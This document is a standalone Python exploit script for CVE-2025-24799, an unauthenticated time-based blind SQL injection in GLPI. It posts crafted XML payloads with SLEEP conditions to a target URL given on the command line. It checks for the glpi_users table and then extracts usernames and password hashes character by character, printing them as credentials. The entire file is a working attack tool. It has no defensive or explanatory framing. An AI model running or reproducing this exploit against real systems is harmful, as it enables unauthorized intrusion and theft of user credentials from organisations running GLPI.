import requests
import time
import sys
import argparse
from colorama import Fore, Style, init

init(autoreset=True)

ASCII_ART = f"""{Fore.GREEN}

 ██████╗ ██╗     ██████╗ ██╗    ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝ ██║     ██╔══██╗██║    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██║  ███╗██║     ██████╔╝██║    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
██║   ██║██║     ██╔═══╝ ██║    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
╚██████╔╝███████╗██║     ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
 ╚═════╝ ╚══════╝╚═╝     ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                                     
                                                      
                              CVE-2025-24799
                                                                                                                        
            GLPI - Unauthenticated SQL Injection (Time-Based Blind)
"""

SLEEP_TIME = 3
TIMEOUT = SLEEP_TIME + 3

headers = {
    "Content-Type": "application/xml",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0"
}

def print_status(msg):
    print(f"{Fore.GREEN}[+] {msg}{Style.RESET_ALL}")

def print_error(msg):
    print(f"{Fore.RED}[-] {msg}{Style.RESET_ALL}")

def send_payload(target, condition):
    payload = f"""<?xml version="1.0"?>
<xml>
    <QUERY>get_params</QUERY>
    <deviceid>' OR IF({condition},SLEEP({SLEEP_TIME}),0)-- -</deviceid>
    <content>creds</content>
</xml>"""
    start = time.time()
    try:
        requests.post(target, headers=headers, data=payload, timeout=TIMEOUT, verify=True)
        elapsed = time.time() - start
        return elapsed > SLEEP_TIME
    except requests.exceptions.Timeout:
        return True
    except Exception as e:
        print_error(f"Erro: {e}")
        return False

def extract_credentials(target):
    print_status("Exploiting CVE-2025-24799")
    
    print_status("Checking table glpi_users...")
    if not send_payload(target, "EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema=database() AND table_name='glpi_users')"):
        print_error("Table 'glpi_users' not found.")
        return

    print_status("Checking name and password...")
    if not send_payload(target, "EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name='glpi_users' AND column_name='name')"):
        print_error("Column 'name' not found.")
        return

    if not send_payload(target, "EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name='glpi_users' AND column_name='password')"):
        print_error(" 'password' not found.")
        return

    print_status("VULNERABLE! Extracting username and passwords... [*]\n")

    for i in range(1, 20):
        name = ""
        for pos in range(1, 50):
            for c in range(32, 127):
                if send_payload(target, f"ASCII(SUBSTRING((SELECT name FROM glpi_users LIMIT {i-1},1),{pos},1))={c}"):
                    name += chr(c)
                    sys.stdout.write(f"\r{Fore.YELLOW}[>] User {i}: name={name}")
                    sys.stdout.flush()
                    break
            else:
                break

        password = ""
        for pos in range(1, 100):
            for c in [*range(48,58), *range(65,91), *range(97,123), 36, 46, 47, 92, 95]:
                if send_payload(target, f"ASCII(SUBSTRING((SELECT password FROM glpi_users LIMIT {i-1},1),{pos},1))={c}"):
                    password += chr(c)
                    sys.stdout.write(f"\r{Fore.YELLOW}[>] User {i}: name={name}, password={password}")
                    sys.stdout.flush()
                    break
            else:
                break

        if name:
            print(f"\n{Fore.CYAN}[+] Credential {i}: {name}:{password}")
        else:
            print_status("[*] Finished! [*]")
            break

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-24799 - GLPI Unauthenticated SQLi Exploit")
    parser.add_argument("-u", "--url", required=True, help="Ex: http://google.com/index.php/ajax")
    args = parser.parse_args()

    print(ASCII_ART)
    extract_credentials(args.url)

if __name__ == "__main__":
    main()
